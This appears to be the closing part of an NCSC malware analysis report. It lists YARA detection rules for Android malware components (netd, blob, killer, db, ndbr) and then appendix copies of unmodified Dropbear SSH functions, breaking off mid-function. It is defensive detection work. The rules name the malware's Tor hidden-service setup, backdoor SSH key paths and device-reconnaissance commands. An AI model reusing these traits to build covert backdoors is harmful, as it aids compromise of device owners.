<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>blob path string found in netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_Blob {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "blob path string found in netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/blob"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Tor hostname path string found in netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_TorDomainPath {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "Tor hostname path string found in netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/prx/hs/hostname"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Shell script commands found in netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_TriageCommands {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "Shell script commands found in netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "settings get secure android_id"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "pm list packages"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "getprop"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>netd wait loop</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_waitloop {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "netd wait loop"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = {38 23 F9 18 01 23 5B 42 01 22 18 00 ?? ?? ?? ?? 0F 20}</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
<p>&nbsp;</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>netd pid for loop</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_pidloop {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "netd pid for loop"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = {1B 68 8A 4A 93 42 ?? ?? ?? ?? C0 46}</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Tor configuration file strings in blob</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule blob_TorCommandLine {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "Tor configuration file strings in blob"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "SocksPort 127.0.0.1:1129"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "DataDirectory /data/local/prx/"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/prx/hs/"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "HiddenServicePort 34371 127.0.0.1:34371"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and 2 of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>blob wait on event loop</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule blob_waitloop {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "blob wait on event loop"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = {0C 23 F9 18 01 23 5B 42 01 22 18 00 ?? ?? ?? ?? 03 1E}</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>killer binary strings</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule killer_Strings {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "killer binary strings"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "netd_"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/proc/%d/exe"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/proc/%d/status"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and uint8(4) == 0x1 and uint16(18) == 0x0028 and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>db Android path strings</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule db_androidpaths {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "db Android path strings"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/.ssh/remove_file.flag"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/.ssh"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/.ssh/authorized_keys"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/.ssh/know_host"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/dropbear_rsa_host_key"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/dropbear_dss_host_key"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/dropbear_ecdsa_host_key"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/session.key"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/.bash_history"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/dropbear_ed25519_host_key"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d/"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/sessions.log.d"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and uint8(4) == 0x1 and uint16(18) == 0x0028 and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>ndbr scan strings</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule ndbr_ScanStrings {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "ndbr scan strings"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "INTERFACE = %s"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "SOURCE = %s"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "IP begin = %s"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "IP end = %s"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "PORT = top"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "PORT begin = %hu"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "PORT end = %hu"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "PING %s"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "SCAN %s"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "*******start*scan********"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "Host %s:"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and uint8(4) == 0x1 and uint16(18) == 0x0028 and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<div>
<h2>Appendix</h2>
<h4>Dropbear unmodified fill_passwd function</h4>
<table>
<tbody>
<tr>
<td>
<p>void fill_passwd<strong>(</strong>const char<strong>*</strong> username<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct passwd <strong>*</strong>pw <strong>=</strong> <strong>NULL</strong><strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_name<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_free<strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_name<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_dir<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_free<strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_dir<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_shell<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_free<strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_shell<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_passwd<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_free<strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_passwd<strong>);</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pw <strong>=</strong> getpwnam<strong>(</strong>username<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(!</strong>pw<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>return</strong><strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ses<strong>.</strong>authstate<strong>.</strong>pw_uid <strong>=</strong> pw<strong>-&gt;</strong>pw_uid<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ses<strong>.</strong>authstate<strong>.</strong>pw_gid <strong>=</strong> pw<strong>-&gt;</strong>pw_gid<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ses<strong>.</strong>authstate<strong>.</strong>pw_name <strong>=</strong> m_strdup<strong>(</strong>pw<strong>-&gt;</strong>pw_name<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ses<strong>.</strong>authstate<strong>.</strong>pw_dir <strong>=</strong> m_strdup<strong>(</strong>pw<strong>-&gt;</strong>pw_dir<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ses<strong>.</strong>authstate<strong>.</strong>pw_shell <strong>=</strong> m_strdup<strong>(</strong>pw<strong>-&gt;</strong>pw_shell<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char <strong>*</strong>passwd_crypt <strong>=</strong> pw<strong>-&gt;</strong>pw_passwd<strong>;</strong></p>
<p>#ifdef HAVE_SHADOW_H</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* get the shadow password if possible */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct spwd <strong>*</strong>spasswd <strong>=</strong> getspnam<strong>(</strong>ses<strong>.</strong>authstate<strong>.</strong>pw_name<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>spasswd <strong>&amp;&amp;</strong> spasswd<strong>-&gt;</strong>sp_pwdp<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; passwd_crypt <strong>=</strong> spasswd<strong>-&gt;</strong>sp_pwdp<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>#endif</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(!</strong>passwd_crypt<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* android supposedly returns NULL */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; passwd_crypt <strong>=</strong> "!!"<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ses<strong>.</strong>authstate<strong>.</strong>pw_passwd <strong>=</strong> m_strdup<strong>(</strong>passwd_crypt<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p><strong>}</strong></p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h4>Dropbear unmodified login_init_entry function</h4>
<table>
<tbody>
<tr>
<td>
<p>/* login_init_entry(struct logininfo *, int, char*, char*, char*)</p>
<p>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - initialise a struct logininfo</p>
<p>&nbsp;*</p>
<p>&nbsp;* Populates a new struct logininfo, a data structure meant to carry</p>
<p>&nbsp;* the information required to portably record login info.</p>
<p>&nbsp;*</p>
<p>&nbsp;* Returns: 1</p>
<p>&nbsp;*/</p>
<p>int</p>
<p>login_init_entry<strong>(</strong>struct logininfo <strong>*</strong>li<strong>,</strong> int pid<strong>,</strong> const char <strong>*</strong>username<strong>,</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;const char <strong>*</strong>hostname<strong>,</strong> const char <strong>*</strong>line<strong>)</strong></p>
<p><strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct passwd <strong>*</strong>pw<strong>;</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset<strong>(</strong>li<strong>,</strong> 0<strong>,</strong> <strong>sizeof</strong><strong>(*</strong>li<strong>));</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; li<strong>-&gt;</strong>pid <strong>=</strong> pid<strong>;</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* set the line information */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>line<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; line_fullname<strong>(</strong>li<strong>-&gt;</strong>line<strong>,</strong> line<strong>,</strong> <strong>sizeof</strong><strong>(</strong>li<strong>-&gt;</strong>line<strong>));</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>username<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strlcpy<strong>(</strong>li<strong>-&gt;</strong>username<strong>,</strong> username<strong>,</strong> <strong>sizeof</strong><strong>(</strong>li<strong>-&gt;</strong>username<strong>));</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pw <strong>=</strong> getpwnam<strong>(</strong>li<strong>-&gt;</strong>username<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>pw <strong>==</strong> <strong>NULL</strong><strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dropbear_exit<strong>(</strong>"login_init_entry: Cannot find user \"%s\""<strong>,</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; li<strong>-&gt;</strong>username<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; li<strong>-&gt;</strong>uid <strong>=</strong> pw<strong>-&gt;</strong>pw_uid<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>hostname<strong>)</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strlcpy<strong>(</strong>li<strong>-&gt;</strong>hostname<strong>,</strong> hostname<strong>,</strong> <strong>sizeof</strong><strong>(</strong>li<strong>-&gt;</strong>hostname<strong>));</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>return</strong> 1<strong>;</strong></p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h4>Dropbear unmodified sessionpty function</h4>
<table>
<tbody>
<tr>
<td>
<p>/* Set up a session pty which will be used to execute the shell or program.</p>
<p>&nbsp;* The pty is allocated now, and kept for when the shell/program executes.</p>
<p>&nbsp;* Returns DROPBEAR_SUCCESS or DROPBEAR_FAILURE */</p>
<p>static int sessionpty<strong>(</strong>struct ChanSess <strong>*</strong> chansess<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unsigned int termlen<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char namebuf<strong>[</strong>65<strong>];</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct passwd <strong>*</strong> pw <strong>=</strong> <strong>NULL</strong><strong>;</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TRACE<strong>((</strong>"enter sessionpty"<strong>))</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(!</strong>svr_pubkey_allows_pty<strong>())</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TRACE<strong>((</strong>"leave sessionpty : pty forbidden by public key option"<strong>))</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>return</strong> DROPBEAR_FAILURE<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; chansess<strong>-&gt;</strong>term <strong>=</strong> buf_getstring<strong>(</strong>ses<strong>.</strong>payload<strong>,</strong> <strong>&amp;</strong>termlen<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>termlen <strong>&gt;</strong> MAX_TERM_LEN<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* TODO send disconnect ? */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TRACE<strong>((</strong>"leave sessionpty: term len too long"<strong>))</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>return</strong> DROPBEAR_FAILURE<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* allocate the pty */</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>chansess<strong>-&gt;</strong>master <strong>!=</strong> <strong>-</strong>1<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dropbear_exit<strong>(</strong>"Multiple pty requests"<strong>);</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>if</strong> <strong>(</strong>pty_allocate<strong>(&amp;</strong>chansess<strong>-&gt;</strong>master<strong>,</strong> <strong>&amp;</strong>chansess<strong>-&gt;</strong>slave<strong>,</strong> namebuf<strong>,</strong> 64<strong>)</strong> <strong>==</strong> 0<strong>)</strong> <strong>{</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TRACE<strong>((</strong>"leave sessionpty: failed to allocate pty"<strong>))</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>return</strong> DROPBEAR_FAILURE<strong>;</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>}</strong></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
